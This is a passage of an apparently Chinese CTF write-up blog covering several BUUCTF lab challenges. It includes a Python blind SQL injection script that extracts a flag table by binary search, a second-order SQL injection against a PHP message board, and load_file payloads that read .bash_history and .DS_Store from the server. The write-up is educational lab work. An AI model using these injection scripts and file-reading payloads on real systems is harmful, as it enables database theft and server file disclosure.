src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444636162-44f4e26b-c3bb-4528-bc37-499382172bec.png#averageHue=%23fbfbfb&clientId=u5150b8c4-54f2-4&from=paste&height=559&id=u195f982c&name=image.png&originHeight=699&originWidth=1252&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27949&status=done&style=none&taskId=ua3ad7827-618f-4f94-8434-29e48718088&title=&width=1001.6" alt="image.png"><br>一路锁头进入chase<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444659392-2794aef8-a394-4883-84c8-6ac1018dccc8.png#averageHue=%23fdfdfd&clientId=u5150b8c4-54f2-4&from=paste&height=729&id=ua10a122f&name=image.png&originHeight=911&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38733&status=done&style=none&taskId=u319d3fad-c987-435f-9fef-a3b2620e833&title=&width=1253.6" alt="image.png"><br>进入leftt：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444675903-c5b4c84d-bcc0-4723-ad06-7603b33bf03c.png#averageHue=%23fbfbfb&clientId=u5150b8c4-54f2-4&from=paste&height=352&id=u9956f940&name=image.png&originHeight=440&originWidth=858&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15456&status=done&style=none&taskId=u38ba107b-aee3-49f8-b173-64a29ac9ed4&title=&width=686.4" alt="image.png"><br>进入shoot：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444687306-6baf8d6e-3d58-452a-bb2a-e2ef3ef4ae68.png#averageHue=%23fafafa&clientId=u5150b8c4-54f2-4&from=paste&height=270&id=ue0b2fa1e&name=image.png&originHeight=338&originWidth=1215&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26460&status=done&style=none&taskId=u0f300da3-abc1-479b-afb8-a5cea772561&title=&width=972" alt="image.png"><br>进入door：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444707551-2c21bd52-f536-4f48-8a99-17acd068e436.png#averageHue=%23fbfbfa&clientId=u5150b8c4-54f2-4&from=paste&height=274&id=ub69bf100&name=image.png&originHeight=343&originWidth=1429&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24275&status=done&style=none&taskId=u1f8f4c44-9ba7-4b58-bce5-e3fe269ebbb&title=&width=1143.2" alt="image.png"><br>最后是有一个js代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444728975-320f5751-f7c6-4514-93a2-7ebbf1d9a48e.png#averageHue=%23f6f6f6&clientId=u5150b8c4-54f2-4&from=paste&height=188&id=u8c107bf4&name=image.png&originHeight=235&originWidth=699&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6718&status=done&style=none&taskId=u75aa8551-d3d3-4b43-adc8-c9353272b66&title=&width=559.2" alt="image.png"><br>进入open：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444747254-46580f4f-77f7-4202-b81c-435c7b33f474.png#averageHue=%23fcfcfb&clientId=u5150b8c4-54f2-4&from=paste&height=242&id=u9302e4ff&name=image.png&originHeight=303&originWidth=1288&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14925&status=done&style=none&taskId=ubfc911dc-998b-4d4a-ba6d-f1b1fe307bd&title=&width=1030.4" alt="image.png"><br>进入fight：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444760614-f10c6ded-b7e6-42fb-bcae-c2964472596c.png#averageHue=%23fbfbfb&clientId=u5150b8c4-54f2-4&from=paste&height=220&id=u84c4faa3&name=image.png&originHeight=275&originWidth=823&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10488&status=done&style=none&taskId=ud5ed04db-63b1-406a-b8ec-b13d16913a9&title=&width=658.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444763941-b1bea201-4737-4d7d-965d-d8e8b916323d.png#averageHue=%23fafaf9&clientId=u5150b8c4-54f2-4&from=paste&height=325&id=u7b3f0803&name=image.png&originHeight=406&originWidth=983&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13364&status=done&style=none&taskId=uee3ede3f-164a-4462-8d3a-56f5e2f9b2d&title=&width=786.4" alt="image.png"><br>审计一下就是让我们排列组合一下，找到正确flag，写个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line">LIST=[<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line">Alllist=permutations(LIST)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> Alllist:</span><br><span class="line">    item=<span class="string">&quot;&quot;</span>.join(item)</span><br><span class="line">    <span class="keyword">if</span> item.startswith(<span class="string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="keyword">and</span> item[-<span class="number">1</span>]==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444795933-aa2f2ce7-e0e2-43b2-a2e5-44ab2ffcfee4.png#averageHue=%2333312f&clientId=u5150b8c4-54f2-4&from=paste&height=167&id=u02774195&name=image.png&originHeight=209&originWidth=456&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30036&status=done&style=none&taskId=uef281ab2-18f8-4744-b732-0c3925054ec&title=&width=364.8" alt="image.png"><br>flag肯定是<code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>考点：SQL注入ASCII位偏移<br>首先来看一个例子，来看看这题的思路，实验表如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667530007187-e58bbcb3-80cf-49d9-b598-053847168786.png#averageHue=%232b2a29&clientId=ue7fcb19b-d912-4&from=paste&height=112&id=uf81d5fe5&name=image.png&originHeight=140&originWidth=449&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5490&status=done&style=none&taskId=u8bd3b678-5359-4299-a4db-b69d9a5bee7&title=&width=359.2" alt="image.png"><br>我们运行<code>select (select 1, &#39;k&#39;)&lt;(select * from tb1 limit 1);</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667530020792-a8c949b3-43e5-466c-bd74-2d596c9606ed.png#averageHue=%231c1b1a&clientId=ue7fcb19b-d912-4&from=paste&height=101&id=u864c1836&name=image.png&originHeight=126&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6667&status=done&style=none&taskId=u1548bcbb-866f-4733-8e93-f8fc00c6561&title=&width=582.4" alt="image.png"><br>输入<code>select (select 1, &#39;l&#39;)&lt;(select * from tb1 limit 1);</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667530044877-04dfcf76-0b46-4709-b903-e75cfe495a92.png#averageHue=%231a1918&clientId=ue7fcb19b-d912-4&from=paste&height=114&id=u2681c5bb&name=image.png&originHeight=143&originWidth=635&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7003&status=done&style=none&taskId=u923eb8be-bcdd-4d59-b0d4-9563509e81f&title=&width=508" alt="image.png"><br>我们可以看到name第一个字段是kino，首字母是k，当我们自定义的字母小于或等于的时候，返回1，大于的时候返回0<br>但是<code>select (select 1, &#39;k&#39;)&gt;(select * from tb1 limit 1);  </code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667530110451-5ca75e50-84b3-4b29-b0b4-3687b3aa9683.png#averageHue=%23222120&clientId=ue7fcb19b-d912-4&from=paste&height=121&id=u7a74100e&name=image.png&originHeight=151&originWidth=703&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7851&status=done&style=none&taskId=u22e8d426-e176-43fd-bf2e-e88cab2631f&title=&width=562.4" alt="image.png"><br>这样就是0，这就是个小bug需要注意一下，这也是第一个踩的坑<br>假如第一个字母都想同，就会比较第二个字母的大小：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667530160952-81d50e96-155f-4a9e-b90d-ebb3da15a455.png#averageHue=%23252423&clientId=ue7fcb19b-d912-4&from=paste&height=98&id=u08d8f2bd&name=image.png&originHeight=123&originWidth=771&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6991&status=done&style=none&taskId=u34185224-e4bf-4705-aecd-1900a5e0159&title=&width=616.8" alt="image.png"></p>
<p>接下来以这个思路来写个脚本：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://857df83b-fba2-469b-9cc9-063d3ee8eea7.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        # sleep(<span class="number">0.3</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            # <span class="string">&quot;id&quot;</span>:f<span class="string">&quot;if(ascii(substr((),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&quot;</span>&#125;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: f<span class="string">&quot;if((select 1,&#x27;&#123;result+chr(mid)&#125;&#x27;)&lt;(select * from f1ag_1s_h3r3_hhhhh),1,0)&quot;</span>&#125;</span><br><span class="line">        # t1=time.time()</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        print(data[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">        # print(r.text)</span><br><span class="line">        # t2=time.time()</span><br><span class="line">        # print(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="title function_">print</span><span class="params">(result.lower()</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667530238992-26ed6c07-c912-4b0f-ab1f-d88b616aa00c.png#averageHue=%23363331&clientId=ue7fcb19b-d912-4&from=paste&height=60&id=ucdc13920&name=image.png&originHeight=75&originWidth=579&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17218&status=done&style=none&taskId=u751b5847-20af-4ecb-991c-8299c5858c1&title=&width=463.2" alt="image.png"><br>最后flag没有另一半括号的原因：<br>调试的时候发现payload有这一步：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667530705740-45dd7ba4-e00a-486d-b15c-2d95ed9e0d3b.png#averageHue=%233a3734&clientId=ue7fcb19b-d912-4&from=paste&height=16&id=u5bf49fee&name=image.png&originHeight=20&originWidth=1035&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9731&status=done&style=none&taskId=u32233de9-e592-4e1f-87e4-dcfc4059f48&title=&width=828" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667530270701-23129f7e-ab45-40f1-a67e-06268df3b781.png#averageHue=%23f2f1f0&clientId=ue7fcb19b-d912-4&from=paste&height=81&id=u0a6cbb45&name=image.png&originHeight=101&originWidth=388&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4509&status=done&style=none&taskId=u9be647ce-a4df-422a-a43d-5b3e8771903&title=&width=310.4" alt="image.png"><br>到这一步又返回0，这个BUG我是真的不太懂了，太奇怪了，最后flag要转小写，否则无法提交</p>
<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>考点：GIt泄露，GIt恢复,SQL二次注入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667619980248-2a796d71-4c0a-47a0-af35-17387b44f02f.png#averageHue=%23fdfdfd&clientId=u3159ce92-9ce0-4&from=paste&height=164&id=u98dfc164&name=image.png&originHeight=205&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6465&status=done&style=none&taskId=u12d11a0d-eb0c-4fd0-8beb-d631e40dc79&title=&width=1536" alt="image.png"><br>进入界面是一个留言板系统，随便点一下发现，发帖你首先得登录：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620001169-fd0a4c63-33bd-4b67-b592-088fcf191e6a.png#averageHue=%23627181&clientId=u3159ce92-9ce0-4&from=paste&height=356&id=u9831ffc4&name=image.png&originHeight=445&originWidth=1175&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9879&status=done&style=none&taskId=uaabaa7d7-8802-4d2d-a9ad-3c9ae86a3ac&title=&width=940" alt="image.png"><br>提示了账号，密码后三位爆破：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620009783-acaaf6b4-237c-4917-8dea-692a0a7f1062.png#averageHue=%23f9c193&clientId=u3159ce92-9ce0-4&from=paste&height=125&id=u702e07af&name=image.png&originHeight=156&originWidth=700&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15023&status=done&style=none&taskId=ubc4a0e88-ed9a-4a55-8a93-a9bbb24f06e&title=&width=560" alt="image.png"><br>得到账号密码，就可以成功发帖，<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620024392-265f2e11-de65-4b61-890d-447599bbccba.png#averageHue=%23fdfcfc&clientId=u3159ce92-9ce0-4&from=paste&height=78&id=u476c66df&name=image.png&originHeight=98&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4197&status=done&style=none&taskId=ue8009f05-fef3-4d64-8b67-3dce17fe730&title=&width=1536" alt="image.png"><br>我一开始看到留言板就大脑不正常的以为是XSS，X了好一会儿发现好像思路本身就错了，然后杀意感知触发，觉得肯定有其他文件没找着，扫了一会儿发现有git文件，用githacker下载：<br>出来了一个write_do文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现缺胳膊少腿，这里就有个之前没接触过的知识点，就是去恢复git，在linux的githacker扫描结果目录输入：<br>我们可以通过使用 <em>git reflog</em> 命令，就可查看到所有历史版本信息。<br><code>git log --reflog</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620353067-bff1b533-9e3f-4e40-96d6-6302fcb400a1.png#averageHue=%23262b31&clientId=u7ed31558-13a1-4&from=paste&height=370&id=u1928693b&name=image.png&originHeight=462&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153612&status=done&style=none&taskId=u330b90cd-abd1-48c7-82a4-bb3249c9bc6&title=&width=547.2" alt="image.png"><br>应该是要我们恢复到第一个e5b2开头的：<br><code>git reset --hard e5b2a2443c</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到了完整的源码，接下来就是白盒测试了<br>这边存在一个SQL二次注入，我们来思考一下，如果我们在第一个board界面：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620547172-57a119b5-4d6d-48a0-8cca-eedcaa4f5ae5.png#averageHue=%23d8d8d8&clientId=u7ed31558-13a1-4&from=paste&height=366&id=u2b1ffaf3&name=image.png&originHeight=458&originWidth=1095&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21995&status=done&style=none&taskId=u5af347bf-30d7-447f-be3b-cbfbf7abdbf&title=&width=876" alt="image.png"><br>也就是发帖界面的catagory里输入<code>&#39;,content=database(),/*</code>,然后进入详细界面，再在留言里写<code>*/#</code>，那么最后我们的sql执行语句就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=database(),/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><code>/**/</code>是多行注释，然后#是单行注释，这样就闭合了我们的语句：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620667476-934b286e-d812-4f0d-88cd-3f3b5a0a004d.png#averageHue=%23fefefe&clientId=u7ed31558-13a1-4&from=paste&height=263&id=ub356922b&name=image.png&originHeight=329&originWidth=1042&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5573&status=done&style=none&taskId=udf6be88e-b2bc-469a-996d-00683c136ea&title=&width=833.6" alt="image.png"><br>可以看到库名为ctf<br>这里大家可能还有个疑惑点，就是addslashes函数不是转义了单引号吗？<br>所以才说是二次注入呀，第一次我们输入的catagory的单引号的确被转义了，但是储存到数据库里面是，它还是变成了单引号，之后我们在留言的时候又调用了一次catagory，这样就二次注入了<br>最后也是爆了库，表，列，都没flag，看了看wp，又是一个不知道的知识点<br>首先load_file这个是我知道的，也尝试过读取，也可以读取：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620784920-73767701-167a-4c47-a5ad-ec57149e7c91.png#averageHue=%23fdfbfa&clientId=u7ed31558-13a1-4&from=paste&height=610&id=uadfa6e4b&name=image.png&originHeight=762&originWidth=883&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111036&status=done&style=none&taskId=u7084de54-fbc2-46ff-9533-15ab3f8ef7b&title=&width=706.4" alt="image.png"><br>但是之后我就不知道flag在那里了，wp里提到了新的知识点：<br><strong>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。</strong><br><code>&#39;,content=load_file(&#39;/home/www/.bash_history&#39;),/*</code>，然后留言同样是<code>*/#</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620846764-3e284c42-f405-4fec-9ef6-aa0e58b11858.png#averageHue=%23fefefe&clientId=u7ed31558-13a1-4&from=paste&height=424&id=ubf278585&name=image.png&originHeight=530&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18707&status=done&style=none&taskId=uc186fa2b-7236-4a11-9a34-d5e2d938ea0&title=&width=896.8" alt="image.png"><br>管理者之前把html.zip解压了，然后移到了www目录下面，最后删除了zip文件，也删除了www&#x2F;html目录下的<code>.DS_Store</code>文件，但是他没删掉tmp目录下的html文件夹，我们尝试读取<br><code>/tmp/html/.DS_Store</code>:<br><strong>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。</strong><br><code>&#39;, content=((load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620967339-f43cf789-1919-489f-b7d1-13c796e7c62e.png#averageHue=%23fefefd&clientId=u7ed31558-13a1-4&from=paste&height=187&id=u9e4356ad&name=image.png&originHeight=234&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7519&status=done&style=none&taskId=u1faf7c42-8bce-4027-8228-dc036fa487b&title=&width=764" alt="image.png"><br>文件内容太大了，导致加载不出来，转为hex：<br><code>&#39;, content=(hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620992430-a8aee2b5-b739-4de3-b59a-9226925fa91d.png#averageHue=%23fefefd&clientId=u7ed31558-13a1-4&from=paste&height=331&id=uee409498&name=image.png&originHeight=414&originWidth=1226&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11558&status=done&style=none&taskId=ud193fe99-4896-4745-b447-549a4067379&title=&width=980.8" alt="image.png"><br>解码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667620998157-0babda78-8e6f-450b-a308-3839b76fb19e.png#averageHue=%23f8f5f2&clientId=u7ed31558-13a1-4&from=paste&height=303&id=u0e12fd5c&name=image.png&originHeight=379&originWidth=1537&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68149&status=done&style=none&taskId=ucfc4f4c7-6773-450c-a834-4815e1c31db&title=&width=1229.6" 